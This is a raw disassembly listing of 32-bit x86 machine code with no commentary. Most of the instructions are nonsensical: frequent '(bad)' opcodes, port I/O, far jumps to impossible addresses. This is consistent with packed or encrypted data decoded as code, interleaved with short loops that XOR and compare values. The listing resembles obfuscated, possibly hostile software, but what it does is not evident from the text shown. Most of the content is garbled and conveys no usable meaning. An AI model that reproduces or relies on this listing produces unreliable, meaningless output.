  408bf7:	xchg   esi,eax
  408bf8:	out    0x42,al
  408bfa:	jl     0x408ba0
  408bfc:	outs   dx,DWORD PTR ds:[esi]
  408bfd:	adc    DWORD PTR [edx+eiz*4],ebp
  408c00:	inc    esp
  408c01:	sub    ecx,DWORD PTR ss:0x8dc10518
  408c08:	aaa    
  408c09:	mov    eax,ds:0x56ff664d
  408c0e:	xor    BYTE PTR [esi+0x4f40bb9d],0xdf
  408c15:	or     al,0xe1
  408c17:	mov    cl,0xa9
  408c19:	pop    ss
  408c1a:	ja     0x408bb3
  408c1c:	dec    edi
  408c1d:	xor    al,0x68
  408c1f:	outs   dx,BYTE PTR ds:[esi]
  408c20:	pop    ecx
  408c21:	xor    ebp,DWORD PTR [edi+0xa241969]
  408c27:	jno    0x408c98
  408c29:	sub    eax,0xbfd2a8b9
  408c2e:	dec    edi
  408c2f:	push   ebp
  408c30:	push   es
  408c31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c32:	xor    ebx,ebp
  408c34:	or     eax,0xae0c3a3d
  408c39:	arpl   WORD PTR [ecx-0xa0ef701],bx
  408c3f:	xor    eax,0x4b734fa9
  408c44:	push   es
  408c45:	ins    DWORD PTR es:[edi],dx
  408c46:	add    BYTE PTR [edx],cl
  408c48:	cs mov bl,0xf8
  408c4b:	xchg   BYTE PTR [ebx],dl
  408c4d:	adc    ecx,DWORD PTR [edi]
  408c4f:	dec    edx
  408c50:	pop    eax
  408c51:	retf   0x338a
  408c54:	sbb    al,0xee
  408c56:	xor    ch,BYTE PTR [ecx-0x14fa921f]
  408c5c:	jbe    0x408c81
  408c5e:	or     eax,0x80d96fb2
  408c63:	(bad)
  408c66:	dec    eax
  408c67:	or     eax,0xb633a7ba
  408c6c:	rol    BYTE PTR [eax],1
  408c6e:	ins    DWORD PTR es:[edi],dx
  408c6f:	add    BYTE PTR [ebx],bh
  408c71:	(bad)  
  408c72:	xchg   ebp,eax
  408c73:	stos   BYTE PTR es:[edi],al
  408c74:	add    al,0x4f
  408c76:	jecxz  0x408c32
  408c78:	jb     0x408c6d
  408c7a:	in     al,dx
  408c7b:	call   0xecb3253e
  408c80:	and    ebp,DWORD PTR [edx]
  408c82:	push   ss
  408c83:	pop    ebx
  408c84:	test   DWORD PTR [eax],esp
  408c86:	cmp    BYTE PTR [edx+0x550340ab],dl
  408c8c:	cdq    
  408c8d:	jg     0x408c51
  408c8f:	mov    eax,0x4793cf60
  408c94:	mov    cl,0x23
  408c96:	push   es
  408c97:	push   esp
  408c98:	jg     0x408cbf
  408c9a:	inc    esi
  408c9b:	add    DWORD PTR ds:0x565df7d0,ebx
  408ca1:	rol    bh,1
  408ca3:	dec    esp
  408ca4:	mov    edx,0x2c4021fd
  408ca9:	addr16 in al,dx
  408cab:	shr    DWORD PTR [eax+0x6a06db55],cl
  408cb1:	stos   DWORD PTR es:[edi],eax
  408cb2:	sahf   
  408cb3:	cmp    al,0x4a
  408cb5:	in     al,0x2c
  408cb7:	jns    0x408c97
  408cb9:	rcr    DWORD PTR [ebx],0xb4
  408cbc:	imul   edi,DWORD PTR [edx+0x53],0xcc2c16c7
  408cc3:	jl     0x408cd2
  408cc5:	inc    ebx
  408cc6:	scas   al,BYTE PTR es:[edi]
  408cc7:	sbb    esp,eax
  408cc9:	pop    ebx
  408cca:	mov    ah,0x94
  408ccc:	jnp    0x408cb0
  408cce:	shl    DWORD PTR [edx],cl
  408cd0:	or     ebx,eax
  408cd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cd4:	lock ret 
  408cd6:	jecxz  0x408cd6
  408cd8:	push   esp
  408cd9:	arpl   WORD PTR [edi],cx
  408cdb:	ret    0x967e
  408cde:	aas    
  408cdf:	sbb    DWORD PTR [esi+0x21],edx
  408ce2:	dec    edi
  408ce3:	jns    0x408d12
  408ce5:	in     eax,0xf
  408ce7:	mov    bh,0x4
  408ce9:	nop
  408cea:	xor    eax,0x8a43
  408cef:	add    eax,edi
  408cf1:	mov    edi,DWORD PTR [ebp-0x14]
  408cf4:	mov    BYTE PTR [ebp+edi*1-0x58],al
  408cf8:	mov    eax,DWORD PTR [ebp-0xc]
  408cfb:	inc    edx
  408cfc:	cmp    edx,eax
  408cfe:	jne    0x408b9f
  408d04:	pop    edi
  408d05:	pop    ebx
  408d06:	mov    eax,DWORD PTR [ebp-0x8]
  408d09:	mov    edx,DWORD PTR [ebp+0x10]
  408d0c:	xor    eax,ecx
  408d0e:	jmp    0x408e37
  408d13:	inc    esp
  408d14:	(bad)  
  408d15:	jno    0x408cee
  408d17:	icebp  
  408d18:	stc    
  408d19:	js     0x408d80
  408d1b:	xchg   esp,eax
  408d1c:	ins    BYTE PTR es:[edi],dx
  408d1d:	retf   0x34a3
  408d20:	xlat   BYTE PTR ds:[ebx]
  408d21:	jecxz  0x408d7a
  408d23:	cmp    DWORD PTR [edi],ebp
  408d25:	jle    0x408da5
  408d27:	or     bh,BYTE PTR [edi+0x7e]
  408d2a:	jle    0x408cd2
  408d2c:	in     al,dx
  408d2d:	xor    DWORD PTR [edi+0x20871d27],0xd69f3220
  408d37:	in     al,0xa4
  408d39:	sub    eax,0x8bf193c2
  408d3e:	daa    
  408d3f:	adc    BYTE PTR [ecx-0x103837aa],cl
  408d45:	pop    esp
  408d46:	and    eax,0xc312cc68
  408d4b:	sbb    DWORD PTR [eax-0x49],esi
  408d4e:	cmp    eax,0x37cfbe3d
  408d53:	hlt    
  408d54:	mov    eax,ds:0x33dc71f3
  408d59:	dec    ecx
  408d5a:	icebp  
  408d5b:	mov    es:0xfa720d30,eax
  408d61:	retf   0x220d
  408d64:	es mov dh,0x7d
  408d67:	xor    bl,BYTE PTR [edi]
  408d69:	or     al,0x88
  408d6b:	dec    eax
  408d6c:	jle    0x408cfa
  408d6e:	(bad)  [edx-0x5e]
  408d71:	int3   
  408d72:	gs pop edi
  408d74:	cld    
  408d75:	mov    eax,ds:0x87e40b4
  408d7a:	push   0xfffffff9
  408d7c:	lock and ebx,ebx
  408d7f:	repnz daa 
  408d81:	sub    ah,BYTE PTR [esi-0x74d16b3f]
  408d87:	adc    bh,al
  408d89:	cmp    ebp,esi
  408d8b:	jp     0x408dd8
  408d8d:	inc    edx
  408d8e:	aas    
  408d8f:	retf   0xc7fd
  408d92:	mov    bl,0x8a
  408d94:	xor    eax,0x7b9e9574
  408d99:	mov    edx,0xdf7d8e59
  408d9e:	popa   
  408d9f:	and    ebx,DWORD PTR [eax-0x47fee160]
  408da5:	xchg   ebx,eax
  408da6:	xchg   edi,eax
  408da7:	jb     0x408da2
  408da9:	xor    ecx,ebx
  408dab:	pop    es
  408dac:	xor    esi,DWORD PTR [eax+0x60a9120]
  408db2:	mov    eax,ds:0x5c76b299
  408db7:	push   ss
  408db8:	pop    edx
  408db9:	dec    ebx
  408dba:	icebp  
  408dbb:	mov    bl,0xc3
  408dbd:	fst    QWORD PTR [edi-0x51]
  408dc0:	call   DWORD PTR [ebp+0x13]
  408dc3:	mov    edx,0x4c3ad0fe
  408dc8:	xchg   DWORD PTR [edi-0x791da0ce],ecx
  408dce:	mov    ebp,0xe1f99641
  408dd3:	test   DWORD PTR [esi-0x6],esp
  408dd6:	in     al,dx
  408dd7:	pop    ecx
  408dd8:	(bad)  
  408dd9:	out    dx,eax
  408dda:	cdq    
  408ddb:	psrlq  mm2,QWORD PTR [ebx-0x3ff641e0]
  408de2:	out    0x4f,al
  408de4:	popa   
  408de5:	ja     0x408e30
  408de7:	mov    ah,0x5a
  408de9:	shl    DWORD PTR [ebx],0xbd
  408dec:	iret   
  408ded:	cwde   
  408dee:	jns    0x408d94
  408df0:	pop    es
  408df1:	adc    BYTE PTR [esi+0x1f],dl
  408df4:	push   esi
  408df5:	jg     0x408e39
  408df7:	sub    DWORD PTR [edx+0x4a],eax
  408dfa:	push   es
  408dfb:	xchg   esi,eax
  408dfc:	or     eax,0x5c61445c
  408e01:	popa   
  408e02:	pop    esp
  408e03:	lock mov ah,cl
  408e06:	test   DWORD PTR [ebp-0xefc49e7],eax
  408e0c:	sub    eax,0x1b67ecd3
  408e11:	mov    eax,DWORD PTR [eax+0x5]
  408e14:	repz mov edi,0x2f9addd9
  408e1a:	push   ecx
  408e1b:	sahf   
  408e1c:	jnp    0x408e5c
  408e1e:	jbe    0x408e5e
  408e20:	xor    dh,ah
  408e22:	jno    0x408dd7
  408e24:	das    
  408e25:	cli    
  408e26:	leave  
  408e27:	mov    edi,0x4a36c6c4
  408e2c:	inc    eax
  408e2d:	jge    0x408e12
  408e2f:	das    
  408e30:	pop    ecx
  408e31:	or     cl,BYTE PTR [edi]
  408e33:	cld    
  408e34:	add    DWORD PTR [ebp-0x7639fceb],edi
  408e3a:	add    ch,cl
  408e3c:	and    al,0x1
  408e3e:	add    BYTE PTR [eax],al
  408e40:	dec    eax
  408e41:	sub    ecx,DWORD PTR [edx]
  408e43:	lock imul edx,DWORD PTR [ecx+0x1c4aeb48],0xb103de2b
  408e4e:	(bad)  
  408e4f:	add    eax,0x7e7e2c35
  408e54:	or     bh,BYTE PTR [edi+0x7e]
  408e57:	jle    0x408e9e
  408e59:	jge    0x408df5
  408e5b:	es ret 0x4bf
  408e5f:	leave  
  408e60:	sbb    eax,0x4d16bcf4
  408e65:	dec    eax
  408e66:	mov    bl,0xf0
  408e68:	jp     0x408e2b
  408e6a:	ss aas 
  408e6c:	jg     0x408e14
  408e6e:	clc    
  408e6f:	ins    BYTE PTR es:[edi],dx
  408e70:	test   DWORD PTR [ecx-0x24],ecx
  408e73:	xor    BYTE PTR [edx-0x49],ah
  408e76:	adc    eax,DWORD PTR [esi-0x392d444a]
  408e7c:	add    al,0xf4
  408e7e:	add    eax,0x757489db
  408e83:	mov    ah,0x20
  408e85:	ror    BYTE PTR [ebx-0x20702e9b],cl
  408e8b:	add    DWORD PTR [ebp+0x38437e3e],0x1d8d58be
  408e95:	sar    BYTE PTR [eax+0x17],1
  408e98:	pop    esp
  408e99:	mov    BYTE PTR [edx],dl
  408e9b:	xor    ebx,DWORD PTR [ebx]
  408e9d:	push   0x72
  408e9f:	aam    0xea
  408ea1:	dec    esi
  408ea2:	push   ds
  408ea3:	lea    edi,[ebx-0x5d]
  408ea6:	mov    BYTE PTR [edi-0x4d5c34ff],bl
  408eac:	xchg   BYTE PTR [eax+eiz*8-0xf],bl
  408eb0:	rcl    DWORD PTR [ecx],0x66
  408eb3:	sbb    eax,0xc4811ea4
  408eb8:	push   edx
  408eb9:	xor    al,0xa7
  408ebb:	fldenv [ebx-0x2de50008]
  408ec1:	push   0xffffffc0
  408ec3:	pop    ebx
  408ec4:	adc    edx,esi
  408ec6:	jae    0x408f15
  408ec8:	xchg   edi,eax
  408ec9:	(bad)  
  408eca:	mov    dl,0x90
  408ecc:	cwde   
  408ecd:	sahf   
  408ece:	cs sub eax,0x58099974
  408ed4:	fwait
  408ed5:	dec    ebp
  408ed6:	adc    DWORD PTR [eax+0xa291e55],ecx
  408edc:	mov    edi,0xb0dc97a6
  408ee1:	cmp    BYTE PTR [edi*1+0x60522f2c],al
  408ee8:	cwde   
  408ee9:	xlat   BYTE PTR ds:[ebx]
  408eea:	jbe    0x408f1b
  408eec:	mov    al,ds:0x80d03edf
  408ef1:	popa   
  408ef2:	sub    ebx,DWORD PTR ds:0xb5fb388b
  408ef8:	and    dh,dl
  408efa:	jno    0x408e7c
  408efc:	cli    
  408efd:	cmp    BYTE PTR [ebx+0x36],bh
  408f00:	mov    ah,0x29
  408f02:	repz pop edx
  408f04:	xchg   ecx,eax
  408f05:	xchg   edi,eax
  408f06:	popa   
  408f07:	js     0x408f7a
  408f09:	clc    
  408f0a:	push   edi
  408f0b:	inc    ebx
  408f0c:	mov    al,ds:0xd48e8eb
  408f11:	pop    ebp
  408f12:	sti    
  408f13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f14:	scas   al,BYTE PTR es:[edi]
  408f15:	and    eax,0xdccf4753
  408f1a:	or     bl,bl
  408f1c:	shl    DWORD PTR [ebx-0x32bf0cd2],1
  408f22:	inc    edi
  408f23:	lock xor edi,DWORD PTR [esi-0x18]
  408f27:	bound  ebx,QWORD PTR [ecx]
  408f29:	mov    esi,fs
  408f2b:	mov    esp,0xdde23eaf
  408f30:	push   ds
  408f31:	arpl   WORD PTR [edx+0x15],cx
  408f34:	push   cs
  408f35:	rol    BYTE PTR [eax],0x55
  408f38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f39:	push   edi
  408f3a:	push   ds
  408f3b:	outs   dx,BYTE PTR ds:[esi]
  408f3c:	dec    ecx
  408f3d:	cdq    
  408f3e:	fnsave [esi+0x1feb32b2]
  408f44:	pop    ebp
  408f45:	push   ds
  408f46:	mov    eax,0x58da9c90
  408f4b:	push   ds
  408f4c:	rcr    BYTE PTR [edi+0x5b],cl
  408f4f:	xchg   edx,eax
  408f50:	into   
  408f51:	add    ch,ch
  408f53:	inc    edx
  408f54:	mov    esi,DWORD PTR [ebx]
  408f56:	or     DWORD PTR [eax-0x49e08e31],edx
  408f5c:	int    0xca
  408f5e:	outs   dx,DWORD PTR ds:[esi]
  408f5f:	dec    eax
  408f60:	(bad)
  408f63:	ror    DWORD PTR [ebx-0x3ecc07bb],1
  408f69:	add    eax,esi
  408f6b:	mov    DWORD PTR [ebp+0x8],eax
  408f6e:	mov    eax,DWORD PTR [ebp+0x8]
  408f71:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f75:	mov    dl,BYTE PTR [ebp-0x1]
  408f78:	cmp    al,dl
  408f7a:	je     0x4090e6
  408f80:	mov    eax,DWORD PTR [ebp+0x8]
  408f83:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f87:	mov    edx,DWORD PTR [ebp+0xc]
  408f8a:	cmp    al,BYTE PTR [edx]
  408f8c:	jne    0x40935e
  408f92:	mov    eax,DWORD PTR [ebp-0x8]
  408f95:	mov    edx,DWORD PTR [ebp+0xc]
  408f98:	jmp    0x4090c1
  408f9d:	jmp    0x7952d498
  408fa2:	loopne 0x40901d
  408fa4:	mov    ch,0xbe
  408fa6:	jmp    0x58abb935
  408fab:	jmp    0x7e6e50e8
  408fb0:	jle    0x408fbc
  408fb2:	jg     0x409032
  408fb4:	jle    0x408f99
  408fb6:	mov    eax,0x9d354b9a
  408fbb:	les    esi,FWORD PTR ds:0x546118e6
  408fc1:	clc    
  408fc2:	les    ecx,FWORD PTR [ebp+0x4f54a7de]
  408fc8:	inc    ebx
  408fc9:	mov    esp,0xae7de250
  408fce:	outs   dx,BYTE PTR ds:[esi]
  408fcf:	std    
  408fd0:	push   edx
  408fd1:	sub    esp,esi
  408fd3:	dec    ebp
  408fd4:	adc    eax,0x3ad034c4
  408fd9:	int3   
  408fda:	fcmovu st,st(7)
  408fdc:	xchg   ebp,edi
  408fde:	sar    DWORD PTR ss:[ebx-0x2d21665b],1
  408fe5:	not    edx
  408fe7:	push   edi
  408fe8:	popf   
  408fe9:	lods   eax,DWORD PTR ds:[esi]
  408fea:	(bad)  
  408feb:	sbb    eax,ebx
  408fed:	ins    BYTE PTR es:[edi],dx
  408fee:	arpl   WORD PTR [esp+eax*2+0x1],di
  408ff2:	lahf   
  408ff3:	(bad)  
  408ff4:	jnp    0x409027
  408ff6:	and    eax,0xbf13e1ef
  408ffb:	sub    al,0xb1
  408ffd:	mov    ebp,0xdd0cf27f
  409002:	mov    cl,0xdb
  409004:	mov    dh,0xd6
  409006:	inc    esp
  409007:	pusha  
  409008:	imul   edx,DWORD PTR [edx],0xffffffd1
  40900b:	loope  0x408f9e
  40900d:	test   eax,0x629abc29
  409012:	cmp    ebp,DWORD PTR [eax]
  409014:	aaa    
  409015:	jmp    0xdb1519cd
  40901a:	or     ch,al
  40901c:	loop   0x409099
  40901e:	jo     0x40909b
  409020:	clc    
  409021:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409022:	pop    ss
  409023:	pop    edi
  409024:	rol    dl,0x14
  409027:	(bad)
  40902b:	repz popa 
  40902d:	loope  0x4090ae
  40902f:	ror    dh,cl
  409031:	idiv   BYTE PTR [ebp+0x7797642]
  409037:	and    eax,0x9a615fd4
  40903c:	shl    edi,0x6e
  40903f:	shl    BYTE PTR [esi+0x5c2eecc1],0x74
  409046:	scas   al,BYTE PTR es:[edi]
  409047:	enter  0xfe91,0x82
  40904b:	push   ss
  40904c:	icebp  
  40904d:	push   esi
  40904e:	push   es
  40904f:	leave  
  409050:	xor    eax,0xad193527
  409055:	ja     0x409068
  409057:	scas   al,BYTE PTR es:[edi]
  409058:	daa    
  409059:	jno    0x408ff4
  40905b:	dec    edi
  40905c:	xor    eax,0xaabb7b51
  409061:	or     al,0xf0
  409063:	ds jmp 0x38ce:0x2b64d81
  40906b:	xor    eax,0x30688c69
  409070:	pop    ebp
  409071:	inc    esp
  409072:	mov    eax,0xb19c3585
  409077:	pushf  
  409078:	jb     0x4090a5
  40907a:	aaa    
  40907b:	and    bh,BYTE PTR [edi]
  40907d:	xchg   edx,eax
  40907e:	fnsave [eax]
  409080:	outs   dx,DWORD PTR ds:[esi]
  409081:	(bad)  
  409083:	pop    eax
  409084:	xchg   esi,eax
  409085:	or     eax,0xdd9f3149
  40908a:	sub    DWORD PTR [ebx],0x12083c1d
  409090:	retf   
  409091:	mov    ah,0x1f
  409093:	or     eax,0x3ee9178
  409098:	mov    ebx,0x1333fb85
  40909d:	jmp    0xea98:0x23c2bd41
  4090a4:	sub    DWORD PTR [eax],eax
  4090a6:	hlt    
  4090a7:	and    DWORD PTR [edx+0x77e88723],ecx
  4090ad:	icebp  
  4090ae:	xchg   edx,eax
  4090af:	lahf   
  4090b0:	push   edx
  4090b1:	push   ds
  4090b2:	add    al,0x3a
  4090b4:	imul   ecx,DWORD PTR [edi+0x2cc54ddd],0x36
  4090bb:	fsub   QWORD PTR [ebp+0x7ee1681c]
  4090c1:	movsx  edx,BYTE PTR [edx]
  4090c4:	xor    eax,ecx
  4090c6:	add    eax,esi
  4090c8:	cmp    edx,eax
  4090ca:	je     0x409229
  4090d0:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  4090d7:	lea    eax,[ebp-0x18]
  4090da:	mov    DWORD PTR [ebp-0x14],eax
  4090dd:	mov    eax,DWORD PTR [ebp-0x14]
  4090e0:	add    DWORD PTR [eax],0x705fa8e
  4090e6:	mov    eax,DWORD PTR [ebp-0x10]
  4090e9:	jmp    0x409212
  4090ee:	lods   eax,DWORD PTR ds:[esi]
  4090ef:	lock test BYTE PTR [ecx+edi*4],al
  4090f3:	sbb    BYTE PTR [ebp-0x47188557],ch
  4090f9:	daa    
  4090fa:	js     0x4090cf
  4090fc:	(bad)  
  4090fd:	pusha  
  4090fe:	frstor [edx]
  409100:	jle    0x409180
  409102:	or     bh,BYTE PTR [edi+0x7e]
  409105:	jle    0x4090d0
  409107:	and    eax,0xe641dda8
  40910c:	loopne 0x40913e
  40910e:	dec    eax
  40910f:	(bad)  
  409110:	sbb    bl,ah
  409112:	cmp    DWORD PTR [eax+edi*2-0x5abc989a],esp
  409119:	push   0x713966a
  40911e:	popf   
  40911f:	(bad)  
  409120:	popa   
  409121:	dec    eax
  409122:	push   0x193d80b3
  409127:	dec    eax
  409128:	inc    ebx
  409129:	jl     0x4090c5
  40912b:	or     esp,DWORD PTR [ebx-0x56b63b68]
  409131:	and    ebx,DWORD PTR ds:0x61ce2560
  409137:	push   ebp
  409138:	mov    ebp,0xa0147ed9
  40913d:	sbb    ch,dl
  40913f:	inc    esp
  409140:	faddp  st(6),st
  409142:	push   ds
  409143:	xor    esp,DWORD PTR [ebx-0x5288211d]
  409149:	push   esp
  40914a:	jmp    edi
  40914c:	xchg   esp,eax
  40914d:	mov    edx,0xc23411fd
  409152:	rol    BYTE PTR [ecx+0x1262fe04],cl
  409158:	jmp    0x4091ca
  40915a:	bound  ecx,QWORD PTR [eax+ebx*1+0x10d70462]
  409161:	jp     0x4091b7
  409163:	jns    0x4091bd
  409165:	gs push 0x311d4023
  40916b:	mov    al,ds:0xe80967cf
  409170:	xor    eax,0x4b218e27
  409175:	jge    0x4090fd
  409177:	xchg   BYTE PTR [eax-0x73],al
  40917a:	cmp    ebp,DWORD PTR [esi-0x5a867db9]
  409180:	pop    edi
  409181:	stos   BYTE PTR es:[edi],al
  409182:	inc    ebp
  409183:	and    esi,ecx
  409185:	sub    DWORD PTR [eax+ebx*4],eax
  409188:	or     DWORD PTR [ecx+0x32],esi
  40918b:	fdivr  DWORD PTR [esi-0x14167215]
  409191:	jecxz  0x409172
  409193:	pop    esp
  409194:	xor    DWORD PTR [edx-0xb0d889d],eax
  40919a:	cmp    edi,eax
  40919c:	out    0xd1,eax
  40919e:	cli    
  40919f:	fwait
  4091a0:	mov    edi,cs
  4091a2:	ins    DWORD PTR es:[edi],dx
  4091a3:	test   DWORD PTR [eax+0xf8bf51e],ebx
  4091a9:	push   esi
  4091aa:	enter  0xd0d0,0x19
  4091ae:	jno    0x409213
  4091b0:	or     eax,0x2e226756
  4091b5:	ret    
  4091b6:	xor    eax,0x4be70466
  4091bb:	xor    edx,edi
  4091bd:	repnz pop ebx
  4091bf:	mov    esp,0xbeb52e37
  4091c4:	jbe    0x40918e
  4091c6:	jmp    0x40921b
  4091c8:	mov    cl,0x77
  4091ca:	adc    BYTE PTR [eax],0x36
  4091cd:	fisubr DWORD PTR ds:0x9b4c221e
  4091d3:	xchg   ebp,eax
  4091d4:	dec    ebp
  4091d5:	sti    
  4091d6:	mov    ds:0xe276e2a7,eax
  4091db:	loopne 0x409258
  4091dd:	adc    ch,dh
  4091df:	xor    BYTE PTR [ebx-0xbacd400],dh
  4091e5:	ins    BYTE PTR es:[edi],dx
  4091e6:	ret    0xa514
  4091e9:	bound  ecx,QWORD PTR [eax+0x69]
  4091ec:	hlt    
  4091ed:	shl    BYTE PTR [edx-0x1249608e],cl
  4091f3:	cld    
  4091f4:	fidiv  WORD PTR [ecx+eiz*2]
  4091f7:	inc    esp
  4091f8:	add    ebx,ecx
  4091fa:	push   ss
  4091fb:	jle    0x40925b
  4091fd:	rcl    eax,0xdc
  409200:	add    edx,ebp
  409202:	shr    BYTE PTR ds:0xab4b3047,1
  409208:	mov    cl,0xe2
  40920a:	jne    0x40927a
  40920c:	les    edi,FWORD PTR ds:0xc3974795
  409212:	mov    edx,DWORD PTR [ebp+0x8]
  409215:	xor    eax,ecx
  409217:	lea    eax,[eax+edx*1+0x32729f]
  40921e:	mov    DWORD PTR [ebp+0x8],eax
  409221:	inc    DWORD PTR [ebp+0xc]
  409224:	jmp    0x408f6e
  409229:	mov    eax,DWORD PTR [ebp-0x10]
  40922c:	xor    eax,ecx
  40922e:	jmp    0x409357
  409233:	or     DWORD PTR ds:0xd93acb2e,ebx
  409239:	stc    
  40923a:	(bad)  [ecx+0x1d87a7c7]
  409240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409241:	mov    al,ds:0x7e23e919
  409246:	jle    0x409252
  409248:	jg     0x4092c8
  40924a:	jle    0x409235
  40924c:	dec    edi
  40924d:	mov    al,ds:0x1edd9408
  409252:	lahf   
  409253:	add    ebp,ecx
  409255:	(bad)  
  409256:	cmp    al,0x26
  409258:	std    
  409259:	shl    BYTE PTR [edx],cl
  40925b:	xor    ch,dh
  40925d:	inc    eax
  40925e:	out    0x41,al
  409260:	iret   
  409261:	sbb    ch,0x0
  409264:	inc    ecx
  409265:	sub    al,BYTE PTR [edi+0x222d0ce7]
  40926b:	mov    al,ds:0x1dfdd1b1
  409270:	xor    bh,bh
  409272:	and    DWORD PTR [ebx],edi
  409274:	arpl   bx,bp
  409276:	push   esp
  409277:	xor    al,0x3a
  409279:	mov    ah,0x8f
  40927b:	pop    ss
  40927c:	dec    edi
  40927d:	and    eax,0xb9a1bad3
  409282:	mov    edx,0x2b7af8e8
  409287:	pusha  
  409288:	mov    bh,0xce
  40928a:	add    cl,BYTE PTR [edx+0x4c]
  40928d:	or     BYTE PTR [eax+ebp*4+0x52ff0b33],ah
  409294:	mov    eax,ds:0xe735d188
  409299:	mov    bl,0x6d
  40929b:	sahf   
  40929c:	push   ecx
  40929d:	in     al,0xf3
  40929f:	mov    WORD PTR [edi+0x35],fs
  4092a2:	ins    BYTE PTR es:[edi],dx
  4092a3:	xor    eax,0xee3abc87
  4092a8:	lods   eax,DWORD PTR ds:[esi]
  4092a9:	int    0x1a
  4092ab:	test   BYTE PTR [esi-0x60],dh
  4092ae:	sub    DWORD PTR [bx-0x4ef4],0xda42189e
  4092b7:	or     al,al
  4092b9:	jno    0x409323
  4092bb:	fsub   QWORD PTR [ebp-0x6e67e90d]
  4092c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092c2:	dec    edx
  4092c3:	mov    al,0x5d
  4092c5:	int3   
  4092c6:	push   ss
  4092c7:	imul   ebx,ebx,0xfffffffa
  4092ca:	mov    ecx,0x3d62c60b
  4092cf:	and    esi,DWORD PTR [esi-0x456c3f17]
  4092d5:	push   0x27af6e7b
  4092da:	sbb    ebp,DWORD PTR [esi-0x511cdf35]
  4092e0:	out    0xa9,eax
  4092e2:	sub    eax,0xb93f7c9f
  4092e7:	stc    
  4092e8:	push   esp
  4092e9:	dec    ecx
  4092ea:	scas   eax,DWORD PTR es:[edi]
  4092eb:	sbb    ebx,DWORD PTR [esi+0x5]
  4092ee:	test   DWORD PTR [eax],ebp
  4092f0:	xor    al,0x7e
  4092f2:	dec    esi
  4092f3:	adc    ebx,DWORD PTR [edx+0x5]
  4092f6:	sbb    eax,0xb828d4ad
  4092fb:	outs   dx,BYTE PTR ds:[esi]
  4092fc:	sbb    BYTE PTR [edx+0xb],0x3c
  409300:	(bad)  
  409301:	je     0x409358
  409303:	loop   0x409311
  409305:	cmp    eax,0x9dac7d18
  40930a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40930b:	(bad)  
  40930c:	mov    ch,0xe6
  40930e:	xchg   esp,eax
  40930f:	push   cs
  409310:	inc    ecx
  409311:	xor    dl,al
  409313:	cdq    
  409314:	mov    esp,0xa1ccb1b9
  409319:	pop    ebx
  40931a:	jmp    0x4092e0
  40931c:	ins    DWORD PTR es:[edi],dx
  40931d:	mov    ebp,0xcdeb8a76
  409322:	push   cs
  409323:	dec    edi
  409324:	iret   
  409325:	pop    ecx
  409326:	sbb    ecx,DWORD PTR [esi+0x3891ae15]
  40932c:	pop    ds
  40932d:	dec    BYTE PTR [esi]
  40932f:	lods   al,BYTE PTR ds:[esi]
  409330:	stc    
  409331:	(bad)  
  409333:	mov    ah,al
  409335:	add    edx,DWORD PTR [esi+0x1e]
  409338:	jnp    0x4092c2
  40933a:	data16 daa 
  40933c:	gs push ebx
  40933e:	pop    esi
  40933f:	fbstp  TBYTE PTR [edx]
  409341:	add    al,0xd4
  409343:	scas   al,BYTE PTR es:[edi]
  409344:	outs   dx,BYTE PTR ds:[esi]
  409345:	push   eax
  409346:	dec    esi
  409347:	xchg   DWORD PTR [edx+0x6c],ecx
  40934a:	cmp    DWORD PTR [ebp+0x34],0x55
  40934e:	jb     0x40934b
  409350:	arpl   WORD PTR [ecx+0x60003c31],si
  409356:	aas    
  409357:	mov    ecx,DWORD PTR [ebp+0x10]
  40935a:	add    eax,esi
  40935c:	mov    DWORD PTR [ecx],eax
  40935e:	pop    esi
  40935f:	leave  
  409360:	ret    0xc
  409363:	push   ebp
  409364:	mov    ebp,esp
  409366:	push   ecx
  409367:	not    eax
  409369:	mov    DWORD PTR [ebp-0x4],0xf89c853c
  409370:	mov    eax,DWORD PTR [ebp-0x4]
  409373:	mov    edx,DWORD PTR [ebp+0x10]
  409376:	add    DWORD PTR ds:0x4235d7,ebx
  40937c:	mov    ecx,0x7510859
  409381:	adc    DWORD PTR ds:0x41235c,0x4235d7
  40938b:	xor    eax,ecx
  40938d:	add    eax,0x32729f
  409392:	and    DWORD PTR ds:0x412368,0x417e41
  40939c:	mov    DWORD PTR [edx],eax
  40939e:	mov    eax,DWORD PTR [ebp+0xc]
  4093a1:	and    DWORD PTR ds:0x4235cf,0x0
  4093ab:	jmp    0x4093bd
  4093b0:	mov    edx,DWORD PTR ds:0x4235cf
  4093b6:	inc    edx
  4093b7:	mov    DWORD PTR ds:0x4235cf,edx
  4093bd:	cmp    DWORD PTR ds:0x4235cf,0x14
  4093c4:	jae    0x4093eb
  4093ca:	cmp    DWORD PTR ds:0x4235cf,0x1c
  4093d1:	jne    0x4093e0
  4093d7:	push   DWORD PTR [ebp-0x20]
  4093da:	call   DWORD PTR ds:0x40d1e8
  4093e0:	jmp    0x4093b0
  4093e5:	sub    DWORD PTR ds:0x41237c,ebx
  4093eb:	xor    eax,ecx
  4093ed:	adc    edx,DWORD PTR ds:0x412360
  4093f3:	push   esi
  4093f4:	add    esi,edx
  4093f6:	mov    esi,DWORD PTR [ebp+0x10]
  4093f9:	mov    edx,0x32729f
  4093fe:	add    eax,edx
  409400:	xor    DWORD PTR ds:0x41abda,0x417e49
  40940a:	mov    DWORD PTR [esi+0x4],eax
  40940d:	mov    eax,ds:0x412398
  409412:	mov    esi,DWORD PTR ds:0x420127
  409418:	sub    esi,eax
  40941a:	xor    eax,DWORD PTR [eax+esi*1]
  40941d:	mov    eax,DWORD PTR [ebp+0x14]
  409420:	mov    esi,DWORD PTR [ebp+0x10]
  409423:	mov    DWORD PTR [esi+0x8],eax
  409426:	mov    DWORD PTR ds:0x412368,0x19
  409430:	cmp    DWORD PTR ds:0x412368,0x0
  409437:	je     0x409465
  40943d:	cmp    DWORD PTR ds:0x412368,0x21
  409444:	jne    0x409455
  40944a:	push   0x2b01
